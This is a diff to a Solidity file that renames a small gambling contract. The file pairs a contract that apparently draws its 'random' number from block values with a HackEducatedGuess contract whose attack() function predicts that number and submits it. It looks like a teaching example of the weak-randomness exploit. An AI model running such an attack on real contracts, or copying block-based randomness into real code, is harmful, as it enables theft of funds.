@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
           pragma solidity ^0.8.10;
 
-          contract FOO {
+          contract gambleGame {
               uint public guess;
 
               function random(uint256 _guess) public {
@@ -11,13 +11,12 @@
                   guess = randomnumber;
               }
           }
-
-          
+   
           contract HackEducatedGuess {
               function attack(address _target) public returns (uint256) {
                   uint256 _randomnumber = uint256(sha256(abi.encodePacked(block.timestamp))) % block.gaslimit;
                   _randomnumber = _randomnumber % block.number;
-                  FOO(_target).random(_randomnumber);
+                  gambleGame(_target).random(_randomnumber);
                   return _randomnumber;
               }
           }
